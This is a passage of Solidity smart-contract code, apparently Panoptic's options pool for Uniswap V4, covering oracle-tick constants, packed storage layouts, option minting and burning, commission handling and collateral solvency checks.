    /// @notice The maximum allowed delta between the currentTick and the Uniswap TWAP tick during a liquidation (~5% down, ~5.26% up).
    /// @dev Mitigates manipulation of the currentTick that causes positions to be liquidated at a less favorable price.
    int256 internal constant MAX_TWAP_DELTA_LIQUIDATION = 513;

    /// @notice The maximum allowed delta (~2%) between the lastObservedTick and the slowOracleTick/fastOracleTick during forceExercise/settleLongPremium.
    /// @dev Ensures token substitution between two accounts is settled safely at a price close to market.
    int256 internal constant MAX_TICK_DELTA_SUBSTITUTION = 203;

    /// @notice The maximum allowed cumulative delta between the fast & slow oracle tick, the current & slow oracle tick, and the last-observed & slow oracle tick.
    /// @dev Falls back on the more conservative (less solvent) tick during times of extreme volatility, where the price moves ~10% in <4 minutes.
    int256 internal constant MAX_TICKS_DELTA = 953;

    /// @notice The maximum allowed ratio for a single chunk, defined as `removedLiquidity / netLiquidity`.
    /// @dev The long premium spread multiplier that corresponds with the MAX_SPREAD value depends on VEGOID,
    /// which can be explored in this calculator: [https://www.desmos.com/calculator/mdeqob2m04](https://www.desmos.com/calculator/mdeqob2m04).
    uint256 internal constant MAX_SPREAD = 9 * (2 ** 32);

    /// @notice The maximum allowed number of legs across all open positions for a user.
    uint64 internal constant MAX_OPEN_LEGS = 25;

    /// @notice Multiplier in basis points for the collateral requirement in the event of a buying power decrease, such as minting or force exercising another user.
    uint256 internal constant BP_DECREASE_BUFFER = 13_333;

    /// @notice Multiplier for the collateral requirement in the general case.
    uint256 internal constant NO_BUFFER = 10_000;

    /// @notice The "engine" of Panoptic - manages AMM liquidity and executes all mints/burns/exercises.
    SemiFungiblePositionManager internal immutable SFPM;

    /// @notice The canonical Uniswap V4 Pool Manager address.
    IPoolManager internal immutable POOL_MANAGER_V4;

    /*//////////////////////////////////////////////////////////////
                                STORAGE
    //////////////////////////////////////////////////////////////*/
    /// @notice Stores a sorted set of 8 price observations used to compute the internal median oracle price.
    // The data for the last 8 interactions is stored as such:
    // LAST UPDATED BLOCK TIMESTAMP (40 bits)
    // [BLOCK.TIMESTAMP]
    // (00000000000000000000000000000000) // dynamic
    //
    // ORDERING of tick indices least --> greatest (24 bits)
    // The value of the bit codon ([#]) is a pointer to a tick index in the tick array.
    // The position of the bit codon from most to least significant is the ordering of the
    // tick index it points to from least to greatest.
    //
    // rank:  0   1   2   3   4   5   6   7
    // slot: [7] [5] [3] [1] [0] [2] [4] [6]
    //       111 101 011 001 000 010 100 110
    //
    // [Constants.MIN_V4POOL_TICK-1] [7]
    // 111100100111011000010111
    //
    // [Constants.MAX_V4POOL_TICK+1] [0]
    // 000011011000100111101001
    //
    // [Constants.MIN_V4POOL_TICK-1] [6]
    // 111100100111011000010111
    //
    // [Constants.MAX_V4POOL_TICK+1] [1]
    // 000011011000100111101001
    //
    // [Constants.MIN_V4POOL_TICK-1] [5]
    // 111100100111011000010111
    //
    // [Constants.MAX_V4POOL_TICK+1] [2]
    // 000011011000100111101001
    //
    // [CURRENT TICK] [4]
    // (000000000000000000000000) // dynamic
    //
    // [CURRENT TICK] [3]
    // (000000000000000000000000) // dynamic
    uint256 internal s_miniMedian;

    /// @notice Nested mapping that tracks the option formation: address => tokenId => leg => premiaGrowth.
    /// @dev Premia growth is taking a snapshot of the chunk premium in SFPM, which is measuring the amount of fees
    /// collected for every chunk per unit of liquidity (net or short, depending on the isLong value of the specific leg index).
    mapping(address account => mapping(TokenId tokenId => mapping(uint256 leg => LeftRightUnsigned premiaGrowth)))
        internal s_options;

    /// @notice Per-chunk `last` value that gives the aggregate amount of premium owed to all sellers when multiplied by the total amount of liquidity `totalLiquidity`.
    /// @dev `totalGrossPremium = totalLiquidity * (grossPremium(perLiquidityX64) - lastGrossPremium(perLiquidityX64)) / 2**64`
    /// @dev Used to compute the denominator for the fraction of premium available to sellers to collect.
    /// @dev LeftRight - right slot is currency0, left slot is currency1.
    mapping(bytes32 chunkKey => LeftRightUnsigned lastGrossPremium) internal s_grossPremiumLast;

    /// @notice Per-chunk accumulator for tokens owed to sellers that have been settled and are now available.
    /// @dev This number increases when buyers pay long premium and when tokens are collected from Uniswap.
    /// @dev It decreases when sellers close positions and collect the premium they are owed.
    /// @dev LeftRight - right slot is currency0, left slot is currency1.
    mapping(bytes32 chunkKey => LeftRightUnsigned settledTokens) internal s_settledTokens;

    /// @notice Tracks the position size of a tokenId for a given user, and the pool utilizations and oracle tick values at the time of last mint.
    //    <-- 24 bits --> <-- 24 bits --> <-- 24 bits --> <-- 24 bits --> <-- 16 bits --> <-- 16 bits --> <-- 128 bits -->
    //   lastObservedTick  slowOracleTick  fastOracleTick   currentTick     utilization1    utilization0    positionSize
    mapping(address account => mapping(TokenId tokenId => PositionBalance positionBalance))
        internal s_positionBalance;

    /// @notice Tracks the position list hash (i.e `keccak256(XORs of abi.encodePacked(positionIdList))`).
    /// @dev A component of this hash also tracks the total number of legs across all positions (i.e. makes sure the length of the provided positionIdList matches).
    /// @dev The purpose of this system is to reduce storage usage when a user has more than one active position.
    /// @dev Instead of having to manage an unwieldy storage array and do lots of loads, we just store a hash of the array.
    /// @dev This hash can be cheaply verified on every operation with a user provided positionIdList - which can then be used for operations
    /// without having to every load any other data from storage.
    //      numLegs                   user positions hash
    //  |<-- 8 bits -->|<------------------ 248 bits ------------------->|
    //  |<---------------------- 256 bits ------------------------------>|
    mapping(address account => uint256 positionsHash) internal s_positionsHash;

    /*//////////////////////////////////////////////////////////////
                   POOL-SPECIFIC IMMUTABLE PARAMETERS
    //////////////////////////////////////////////////////////////*/

    // The parameters will be encoded in calldata at `_getImmutableArgsOffset()` as follows:
    // abi.encodePacked(address collateralToken0, address collateralToken1, address oracleContract, uint256 poolId, abi.encode(PoolKey poolKey))
    // bytes: 0                    20                   40                   60                   92
    //        |<---- 160 bits ---->|<---- 160 bits ---->|<---- 160 bits ---->|<---- 256 bits ---->|<---- 1280 bits ---->|
    //           collateralToken0     collateralToken1      oracleContract           poolId               poolKey

    /// @notice Get the collateral token corresponding to currency0 of the Uniswap pool.
    /// @return Collateral token corresponding to currency0 in Uniswap
    function collateralToken0() public pure returns (CollateralTracker) {
        return CollateralTracker(_getArgAddress(0));
    }

    /// @notice Get the collateral token corresponding to currency1 of the Uniswap pool.
    /// @return Collateral token corresponding to currency1 in Uniswap
    function collateralToken1() public pure returns (CollateralTracker) {
        return CollateralTracker(_getArgAddress(20));
    }

    /// @notice Get the address of the external oracle contract used by this Panoptic Pool.
    /// @return The external oracle contract used by this Panoptic Pool
    function oracleContract() public pure returns (IV3CompatibleOracle) {
        return IV3CompatibleOracle(_getArgAddress(40));
    }

    /// @notice Get the Uniswap Pool ID for the V4 pool used by this Panoptic Pool (hash of `poolKey`).
    /// @return The Uniswap V4 Pool ID for this Panoptic Pool
    function _V4PoolId() internal pure returns (PoolId) {
        return PoolId.wrap(bytes32(_getArgUint256(60)));
    }

    /// @notice Get the pool key for the Uniswap V4 pool used by this Panoptic Pool.
    /// @return key The Uniswap V4 Pool Key for this Panoptic Pool
    function poolKey() public pure returns (PoolKey calldata key) {
        uint256 offset = _getImmutableArgsOffset();

        assembly {
            key := add(offset, 92)
        }
    }

    /*//////////////////////////////////////////////////////////////
                             INITIALIZATION
    //////////////////////////////////////////////////////////////*/

    /// @notice Store the address of the canonical SemiFungiblePositionManager (SFPM) and Uniswap V4 pool manager contracts.
    /// @param _sfpm The address of the SFPM
    /// @param _poolManager The address of the canonical Uniswap V4 pool manager
    constructor(SemiFungiblePositionManager _sfpm, IPoolManager _poolManager) {
        SFPM = _sfpm;
        POOL_MANAGER_V4 = _poolManager;
    }

    /// @notice Initializes the median oracle of a new `PanopticPool` instance with median oracle state and performs initial token approvals.
    /// @dev Must be called first (by the factory contract) before any transaction can occur.
    function initialize() external {
        // reverts if this contract has already been initialized (assuming block.timestamp > 0)
        if (s_miniMedian != 0) revert Errors.PoolAlreadyInitialized();

        (, int24 currentTick, , , , , ) = oracleContract().slot0();

        // Store the median data
        unchecked {
            s_miniMedian =
                (uint256(block.timestamp) << 216) +
                // magic number which adds (7,5,3,1,0,2,4,6) order and minTick in positions 7, 5, 3 and maxTick in 6, 4, 2
                // see comment on s_miniMedian initialization for format of this magic number
                (uint256(0xF590A6F276170D89E9F276170D89E9F276170D89E9000000000000)) +
                (uint256(uint24(currentTick)) << 24) + // add to slot 1 (rank 3)
                (uint256(uint24(currentTick))); // add to slot 0 (rank 4)
        }

        POOL_MANAGER_V4.setOperator(address(SFPM), true);
        POOL_MANAGER_V4.setOperator(address(collateralToken0()), true);
        POOL_MANAGER_V4.setOperator(address(collateralToken1()), true);
    }

    /*//////////////////////////////////////////////////////////////
                              EIP SUPPORT
    //////////////////////////////////////////////////////////////*/

    // note: this contract does not need to accept batch ERC1155 transfers from the SFPM or supply ERC-165 calls
    // thus, `supportsInterface` and `onERC1155BatchReceived` are left unimplemented to reduce contract size

    /// @notice Returns magic value when called by the `SemiFungiblePositionManager` contract to indicate that this contract supports ERC1155.
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    /*//////////////////////////////////////////////////////////////
                             QUERY HELPERS
    //////////////////////////////////////////////////////////////*/

    /// @notice Reverts if the caller has a lower collateral balance than required to meet the provided `minValue0` and `minValue1`.
    /// @dev Can be used for composable slippage checks with `multicall` (such as for a force exercise or liquidation).
    /// @param minValue0 The minimum acceptable `currency0` value of collateral
    /// @param minValue1 The minimum acceptable `currency1` value of collateral
    function assertMinCollateralValues(uint256 minValue0, uint256 minValue1) external view {
        CollateralTracker ct0 = collateralToken0();
        CollateralTracker ct1 = collateralToken1();
        if (
            ct0.convertToAssets(ct0.balanceOf(msg.sender)) < minValue0 ||
            ct1.convertToAssets(ct1.balanceOf(msg.sender)) < minValue1
        ) revert Errors.AccountInsolvent();
    }

    /// @notice Determines if account is eligible to withdraw or transfer collateral.
    /// @dev Checks whether account is solvent with `BP_DECREASE_BUFFER` according to `_validateSolvency`.
    /// @dev Prevents insolvent and near-insolvent accounts from withdrawing collateral before they are liquidated.
    /// @dev Reverts if account is not solvent with `BP_DECREASE_BUFFER`.
    /// @param user The account to check for collateral withdrawal eligibility
    /// @param positionIdList The list of all option positions held by `user`
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    function validateCollateralWithdrawable(
        address user,
        TokenId[] calldata positionIdList,
        bool usePremiaAsCollateral
    ) external view {
        _validateSolvency(user, positionIdList, BP_DECREASE_BUFFER, usePremiaAsCollateral);
    }

    /// @notice Returns the total amount of premium accumulated for a list of positions and a list containing the corresponding `PositionBalance` information for each position.
    /// @param user Address of the user that owns the positions
    /// @param positionIdList List of positions. Written as `[tokenId1, tokenId2, ...]`
    /// @param includePendingPremium If true, include premium that is owed to the user but has not yet settled; if false, only include premium that is available to collect
    /// @return The total amount of premium owed (which may `includePendingPremium`) to the short legs in `positionIdList` (currency0: right slot, currency1: left slot)
    /// @return The total amount of premium owed by the long legs in `positionIdList` (currency0: right slot, currency1: left slot)
    /// @return A list of `PositionBalance` data (balance and pool utilization/oracle ticks at last mint) for each position, of the form `[[tokenId0, PositionBalance_0], [tokenId1, PositionBalance_1], ...]`
    function getAccumulatedFeesAndPositionsData(
        address user,
        bool includePendingPremium,
        TokenId[] calldata positionIdList
    ) external view returns (LeftRightUnsigned, LeftRightUnsigned, uint256[2][] memory) {
        // Compute the accumulated premia for all tokenId in positionIdList (includes short+long premium)
        return
            _calculateAccumulatedPremia(
                user,
                positionIdList,
                COMPUTE_PREMIA_AS_COLLATERAL,
                includePendingPremium,
                V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId())
            );
    }

    /// @notice Calculate the accumulated premia owed from the option buyer to the option seller.
    /// @param user The holder of options
    /// @param positionIdList The list of all option positions held by user
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    /// @param includePendingPremium If true, include premium that is owed to the user but has not yet settled; if false, only include premium that is available to collect
    /// @param atTick The current tick of the Uniswap pool
    /// @return shortPremium The total amount of premium owed (which may `includePendingPremium`) to the short legs in `positionIdList` (currency0: right slot, currency1: left slot)
    /// @return longPremium The total amount of premium owed by the long legs in `positionIdList` (currency0: right slot, currency1: left slot)
    /// @return balances A list of balances and pool utilization for each position, of the form `[[tokenId0, balances0], [tokenId1, balances1], ...]`
    function _calculateAccumulatedPremia(
        address user,
        TokenId[] calldata positionIdList,
        bool usePremiaAsCollateral,
        bool includePendingPremium,
        int24 atTick
    )
        internal
        view
        returns (
            LeftRightUnsigned shortPremium,
            LeftRightUnsigned longPremium,
            uint256[2][] memory balances
        )
    {
        balances = new uint256[2][](positionIdList.length);

        // loop through each option position/tokenId
        for (uint256 k = 0; k < positionIdList.length; ) {
            TokenId tokenId = positionIdList[k];

            balances[k] = [
                TokenId.unwrap(tokenId),
                PositionBalance.unwrap(s_positionBalance[user][tokenId])
            ];

            (
                LeftRightSigned[4] memory premiaByLeg,
                uint256[2][4] memory premiumAccumulatorsByLeg
            ) = _getPremia(
                    tokenId,
                    LeftRightUnsigned.wrap(balances[k][1]).rightSlot(),
                    user,
                    usePremiaAsCollateral,
                    atTick
                );

            uint256 numLegs = tokenId.countLegs();
            for (uint256 leg = 0; leg < numLegs; ) {
                if (tokenId.isLong(leg) == 0) {
                    if (!includePendingPremium) {
                        bytes32 chunkKey = keccak256(
                            abi.encodePacked(
                                tokenId.strike(leg),
                                tokenId.width(leg),
                                tokenId.tokenType(leg)
                            )
                        );

                        (uint256 totalLiquidity, , ) = _getLiquidities(tokenId, leg);
                        shortPremium = shortPremium.add(
                            _getAvailablePremium(
                                totalLiquidity,
                                s_settledTokens[chunkKey],
                                s_grossPremiumLast[chunkKey],
                                LeftRightUnsigned.wrap(
                                    uint256(LeftRightSigned.unwrap(premiaByLeg[leg]))
                                ),
                                premiumAccumulatorsByLeg[leg]
                            )
                        );
                    } else {
                        shortPremium = shortPremium.add(
                            LeftRightUnsigned.wrap(
                                uint256(LeftRightSigned.unwrap(premiaByLeg[leg]))
                            )
                        );
                    }
                } else {
                    longPremium = LeftRightUnsigned.wrap(
                        uint256(
                            LeftRightSigned.unwrap(
                                LeftRightSigned
                                    .wrap(int256(LeftRightUnsigned.unwrap(longPremium)))
                                    .sub(premiaByLeg[leg])
                            )
                        )
                    );
                }
                unchecked {
                    ++leg;
                }
            }

            unchecked {
                ++k;
            }
        }
    }

    /*//////////////////////////////////////////////////////////////
                          ONBOARD MEDIAN TWAP
    //////////////////////////////////////////////////////////////*/

    /// @notice Updates the internal median with the last oracle observation if the `MEDIAN_PERIOD` has elapsed.
    function pokeMedian() external {
        IV3CompatibleOracle oracle = oracleContract();

        (, , uint16 observationIndex, uint16 observationCardinality, , , ) = oracle.slot0();

        (, uint256 medianData) = PanopticMath.computeInternalMedian(
            observationIndex,
            observationCardinality,
            Constants.MEDIAN_PERIOD,
            s_miniMedian,
            oracle
        );

        if (medianData != 0) s_miniMedian = medianData;
    }

    /*//////////////////////////////////////////////////////////////
                          MINT/BURN INTERFACE
    //////////////////////////////////////////////////////////////*/

    /// @notice Validates the current options of the user, and mints a new position.
    /// @param positionIdList The list of currently held positions by the user, where the newly minted position(token) will be the last element in `positionIdList`
    /// @param positionSize The size of the position to be minted, expressed in terms of the asset
    /// @param effectiveLiquidityLimitX32 Maximum amount of "spread" defined as `removedLiquidity/netLiquidity` for a new position and
    /// denominated as X32 = (`ratioLimit * 2^32`)
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    function mintOptions(
        TokenId[] calldata positionIdList,
        uint128 positionSize,
        uint64 effectiveLiquidityLimitX32,
        int24 tickLimitLow,
        int24 tickLimitHigh,
        bool usePremiaAsCollateral
    ) external {
        _mintOptions(
            positionIdList,
            positionSize,
            effectiveLiquidityLimitX32,
            tickLimitLow,
            tickLimitHigh,
            usePremiaAsCollateral
        );
    }

    /// @notice Closes and burns the caller's entire balance of `tokenId`.
    /// @param tokenId The tokenId of the option position to be burnt
    /// @param newPositionIdList The new positionIdList without the token being burnt
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    function burnOptions(
        TokenId tokenId,
        TokenId[] calldata newPositionIdList,
        int24 tickLimitLow,
        int24 tickLimitHigh,
        bool usePremiaAsCollateral
    ) external {
        _burnOptions(COMMIT_LONG_SETTLED, tokenId, msg.sender, tickLimitLow, tickLimitHigh);

        uint256 medianData = _validateSolvency(
            msg.sender,
            newPositionIdList,
            NO_BUFFER,
            usePremiaAsCollateral
        );

        // Update `s_miniMedian` with a new observation if the last observation is old enough (returned medianData is nonzero)
        if (medianData != 0) s_miniMedian = medianData;
    }

    /// @notice Closes and burns the caller's entire balance of each `tokenId` in `positionIdList.
    /// @param positionIdList The list of tokenIds for the option positions to be burnt
    /// @param newPositionIdList The new positionIdList without the token(s) being burnt
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    function burnOptions(
        TokenId[] calldata positionIdList,
        TokenId[] calldata newPositionIdList,
        int24 tickLimitLow,
        int24 tickLimitHigh,
        bool usePremiaAsCollateral
    ) external {
        _burnAllOptionsFrom(
            msg.sender,
            tickLimitLow,
            tickLimitHigh,
            COMMIT_LONG_SETTLED,
            positionIdList
        );

        uint256 medianData = _validateSolvency(
            msg.sender,
            newPositionIdList,
            NO_BUFFER,
            usePremiaAsCollateral
        );

        // Update `s_miniMedian` with a new observation if the last observation is old enough (returned medianData is nonzero)
        if (medianData != 0) s_miniMedian = medianData;
    }

    /*//////////////////////////////////////////////////////////////
                         POSITION MINTING LOGIC
    //////////////////////////////////////////////////////////////*/

    /// @notice Validates the current options of the user, and mints a new position.
    /// @param positionIdList The list of currently held positions by the user, where the newly minted position(token) will be the last element in `positionIdList`
    /// @param positionSize The size of the position to be minted, expressed in terms of the asset
    /// @param effectiveLiquidityLimitX32 Maximum amount of "spread" defined as `removedLiquidity/netLiquidity` for a new position and
    /// denominated as X32 = (`ratioLimit * 2^32`)
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    function _mintOptions(
        TokenId[] calldata positionIdList,
        uint128 positionSize,
        uint64 effectiveLiquidityLimitX32,
        int24 tickLimitLow,
        int24 tickLimitHigh,
        bool usePremiaAsCollateral
    ) internal {
        // the new tokenId will be the last element in `positionIdList`
        TokenId tokenId;
        unchecked {
            tokenId = positionIdList[positionIdList.length - 1];
        }

        // do duplicate checks and the checks related to minting and positions
        _validatePositionList(msg.sender, positionIdList, 1);

        // make sure the tokenId is for this Panoptic pool
        if (tokenId.poolId() != SFPM.getPoolId(_V4PoolId()))
            revert Errors.InvalidTokenIdParameter(0);

        // disallow user to mint exact same position
        // in order to do it, user should burn it first and then mint
        if (PositionBalance.unwrap(s_positionBalance[msg.sender][tokenId]) != 0)
            revert Errors.PositionAlreadyMinted();

        // Mint in the SFPM and update state of collateral
        (uint32 poolUtilizations, LeftRightUnsigned commissions) = _mintInSFPMAndUpdateCollateral(
            tokenId,
            positionSize,
            effectiveLiquidityLimitX32,
            tickLimitLow,
            tickLimitHigh
        );

        uint96 tickData;
        {
            (
                int24 fastOracleTick,
                int24 slowOracleTick,
                int24 lastObservedTick,
                uint256 medianData
            ) = PanopticMath.getOracleTicks(oracleContract(), s_miniMedian);

            tickData = PositionBalanceLibrary.packTickData(
                V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId()),
                fastOracleTick,
                slowOracleTick,
                lastObservedTick
            );

            // Update `s_miniMedian` with a new observation if the last observation is old enough (returned medianData is nonzero)
            if (medianData != 0) s_miniMedian = medianData;
        }

        PositionBalance balanceData = PositionBalanceLibrary.storeBalanceData(
            positionSize,
            poolUtilizations,
            tickData
        );

        // update the users options balance of position `tokenId`
        // NOTE: user can't mint same position multiple times, so set the positionSize instead of adding
        s_positionBalance[msg.sender][tokenId] = balanceData;

        // Perform solvency check on user's account to ensure they had enough buying power to mint the option
        // Add an initial buffer to the collateral requirement to prevent users from minting their account close to insolvency
        _checkSolvency(
            msg.sender,
            positionIdList,
            tickData,
            BP_DECREASE_BUFFER,
            usePremiaAsCollateral
        );

        emit OptionMinted(msg.sender, tokenId, balanceData, commissions);
    }

    /// @notice Move all the required liquidity to/from the AMM and settle any required collateral deltas.
    /// @param tokenId The option position to be minted
    /// @param positionSize The size of the position, expressed in terms of the asset
    /// @param effectiveLiquidityLimitX32 Maximum amount of "spread" defined as `removedLiquidity/netLiquidity`
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price
    /// @return poolUtilizations Packing of the pool utilization (how much funds are in the Panoptic pool versus the AMM pool) at the time of minting,
    /// right 64bits for currency0 and left 64bits for currency1. When safeMode is active, it returns 100% pool utilization for both tokens
    /// @return commissions The total amount of commissions (base rate + ITM spread) paid for currency0 (right) and currency1 (left)
    function _mintInSFPMAndUpdateCollateral(
        TokenId tokenId,
        uint128 positionSize,
        uint64 effectiveLiquidityLimitX32,
        int24 tickLimitLow,
        int24 tickLimitHigh
    ) internal returns (uint32 poolUtilizations, LeftRightUnsigned commissions) {
        bool safeMode = isSafeMode();

        // if safeMode, enforce covered deployment
        if (safeMode) {
            if (tickLimitLow > tickLimitHigh) {
                (tickLimitLow, tickLimitHigh) = (tickLimitHigh, tickLimitLow);
            }
        }

        (LeftRightUnsigned[4] memory collectedByLeg, LeftRightSigned totalSwapped) = SFPM
            .mintTokenizedPosition(poolKey(), tokenId, positionSize, tickLimitLow, tickLimitHigh);

        _updateSettlementPostMint(
            tokenId,
            collectedByLeg,
            positionSize,
            effectiveLiquidityLimitX32
        );

        (poolUtilizations, commissions) = _payCommissionAndWriteData(
            tokenId,
            positionSize,
            totalSwapped,
            tickLimitLow < tickLimitHigh
        );

        if (safeMode) poolUtilizations = uint32(10_000 + (10_000 << 16));
    }

    /// @notice Take the commission fees for minting `tokenId` and settle any other required collateral deltas.
    /// @param tokenId The option position
    /// @param positionSize The size of the position, expressed in terms of the asset
    /// @param totalSwapped The amount of tokens moved during creation of the option position
    /// @param isCovered Whether the option was minted as covered (no swap occurred if ITM)
    /// @return Packing of the pool utilization (how much funds are in the Panoptic pool versus the AMM pool at the time of minting),
    /// right 64bits for currency0 and left 64bits for currency1, defined as `(inAMM * 10_000) / totalAssets()`
    /// where totalAssets is the total tracked assets in the AMM and PanopticPool minus fees and donations to the Panoptic pool
    /// @return The total amount of commissions (base rate + ITM spread) paid for token0 (right) and token1 (left)
    function _payCommissionAndWriteData(
        TokenId tokenId,
        uint128 positionSize,
        LeftRightSigned totalSwapped,
        bool isCovered
    ) internal returns (uint32, LeftRightUnsigned) {
        // compute how much of tokenId is long and short positions
        (LeftRightSigned longAmounts, LeftRightSigned shortAmounts) = PanopticMath
            .computeExercisedAmounts(tokenId, positionSize);

        (uint32 utilization0, uint128 commission0) = collateralToken0().takeCommissionAddData(
            msg.sender,
            longAmounts.rightSlot(),
            shortAmounts.rightSlot(),
            totalSwapped.rightSlot(),
            isCovered
        );
        (uint32 utilization1, uint128 commission1) = collateralToken1().takeCommissionAddData(
            msg.sender,
            longAmounts.leftSlot(),
            shortAmounts.leftSlot(),
            totalSwapped.leftSlot(),
            isCovered
        );

        // return pool utilizations as two uint16 (pool Utilization is always <= 10000)
        unchecked {
            return (
                utilization0 + (utilization1 << 16),
                LeftRightUnsigned.wrap(commission0).toLeftSlot(commission1)
            );
        }
    }

    /*//////////////////////////////////////////////////////////////
                         POSITION BURNING LOGIC
    //////////////////////////////////////////////////////////////*/

    /// @notice Close all options in `positionIdList`.
    /// @param owner The owner of the option position to be closed
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price on each option close
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price on each option close
    /// @param commitLongSettled Whether to commit the long premium that will be settled to storage (disabled during liquidations)
    /// @param positionIdList The list of option positions to close
    /// @return netPaid The net amount of tokens paid after closing the positions
    /// @return premiasByLeg The amount of premia settled by the user for each leg of the position
    function _burnAllOptionsFrom(
        address owner,
        int24 tickLimitLow,
        int24 tickLimitHigh,
        bool commitLongSettled,
        TokenId[] calldata positionIdList
    ) internal returns (LeftRightSigned netPaid, LeftRightSigned[4][] memory premiasByLeg) {
        premiasByLeg = new LeftRightSigned[4][](positionIdList.length);
        for (uint256 i = 0; i < positionIdList.length; ) {
            LeftRightSigned paidAmounts;
            (paidAmounts, premiasByLeg[i]) = _burnOptions(
                commitLongSettled,
                positionIdList[i],
                owner,
                tickLimitLow,
                tickLimitHigh
            );
            netPaid = netPaid.add(paidAmounts);
            unchecked {
                ++i;
            }
        }
    }

    /// @notice Close a single option position.
    /// @param tokenId The option position to burn
    /// @param owner The owner of the option position to be burned
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price on each option close
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price on each option close
    /// @param commitLongSettled Whether to commit the long premium that will be settled to storage (disabled during liquidations)
    /// @return paidAmounts The net amount of tokens paid after closing the position
    /// @return premiaByLeg The amount of premia settled by the user for each leg of the position
    function _burnOptions(
        bool commitLongSettled,
        TokenId tokenId,
        address owner,
        int24 tickLimitLow,
        int24 tickLimitHigh
    ) internal returns (LeftRightSigned paidAmounts, LeftRightSigned[4] memory premiaByLeg) {
        uint128 positionSize = s_positionBalance[owner][tokenId].positionSize();

        // burn position and do exercise checks
        (premiaByLeg, paidAmounts) = _burnAndHandleExercise(
            commitLongSettled,
            tickLimitLow,
            tickLimitHigh,
            tokenId,
            positionSize,
            owner
        );

        emit OptionBurnt(owner, positionSize, tokenId, premiaByLeg);
    }

    /// @notice Validates the solvency of `user`.
    /// @dev Falls back to the most conservative (least solvent) oracle tick if the sum of the squares of the deltas between all oracle ticks exceeds `MAX_TICKS_DELTA^2`.
    /// @dev Effectively, this means that the users must be solvent at all oracle ticks if the at least one of the ticks is sufficiently stale.
    /// @param user The account to validate
    /// @param positionIdList The list of positions to validate solvency for
    /// @param buffer The buffer to apply to the collateral requirement for `user`
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    /// @return If nonzero (enough time has passed since last observation), the updated value for `s_miniMedian` with a new observation
    function _validateSolvency(
        address user,
        TokenId[] calldata positionIdList,
        uint256 buffer,
        bool usePremiaAsCollateral
    ) internal view returns (uint256) {
        (
            int24 fastOracleTick,
            int24 slowOracleTick,
            int24 lastObservedTick,
            uint256 medianData
        ) = PanopticMath.getOracleTicks(oracleContract(), s_miniMedian);

        _checkSolvency(
            user,
            positionIdList,
            PositionBalanceLibrary.packTickData(
                V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId()),
                fastOracleTick,
                slowOracleTick,
                lastObservedTick
            ),
            buffer,
            usePremiaAsCollateral
        );

        return medianData;
    }

    /// @notice Validates the solvency of `user` from tickData.
    /// @param user The account to validate
    /// @param positionIdList The list of positions to validate solvency for
    /// @param tickData The packed tick data to check solvency at
    /// @param buffer The buffer to apply to the collateral requirement for `user`
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    function _checkSolvency(
        address user,
        TokenId[] calldata positionIdList,
        uint96 tickData,
        uint256 buffer,
        bool usePremiaAsCollateral
    ) internal view {
        // check that the provided positionIdList matches the positions in memory
        _validatePositionList(user, positionIdList, 0);

        (
            int24 currentTick,
            int24 fastOracleTick,
            int24 slowOracleTick,
            int24 lastObservedTick
        ) = PositionBalanceLibrary.unpackTickData(tickData);

        int24[] memory atTicks;
        // Fall back to a conservative approach if there's high deviation between internal ticks:
        // Check solvency at the slowOracleTick, currentTick, and lastObservedTick instead of just the fastOracleTick.
        // Deviation is measured as the magnitude of a 3D vector:
        // (fastOracleTick - slowOracleTick, lastObservedTick - slowOracleTick, currentTick - slowOracleTick)
        // This approach is more conservative than checking each tick difference individually,
        // as the Euclidean norm is always greater than or equal to the maximum of the individual differences.
        unchecked {
            if (
                int256(fastOracleTick - slowOracleTick) ** 2 +
                    int256(lastObservedTick - slowOracleTick) ** 2 +
                    int256(currentTick - slowOracleTick) ** 2 >
                MAX_TICKS_DELTA ** 2
            ) {
                atTicks = new int24[](4);
                atTicks[0] = fastOracleTick;
                atTicks[1] = slowOracleTick;
                atTicks[2] = lastObservedTick;
                atTicks[3] = currentTick;
            } else {
                atTicks = new int24[](1);
                atTicks[0] = fastOracleTick;
            }
        }

        _checkSolvencyAtTicks(
            user,
            positionIdList,
            currentTick,
            atTicks,
            buffer,
            ASSERT_SOLVENCY,
            usePremiaAsCollateral
        );
    }

    /// @notice Burns and handles the exercise of options.
    /// @param commitLongSettled Whether to commit the long premium that will be settled to storage (disabled during liquidations)
    /// @param tickLimitLow The lower bound of an acceptable open interval for the ending price
    /// @param tickLimitHigh The upper bound of an acceptable open interval for the ending price
    /// @param tokenId The option position to burn
    /// @param positionSize The size of the option position, expressed in terms of the asset
    /// @param owner The owner of the option position
    /// @return premiaByLeg The premia settled by the user for each leg of the option position
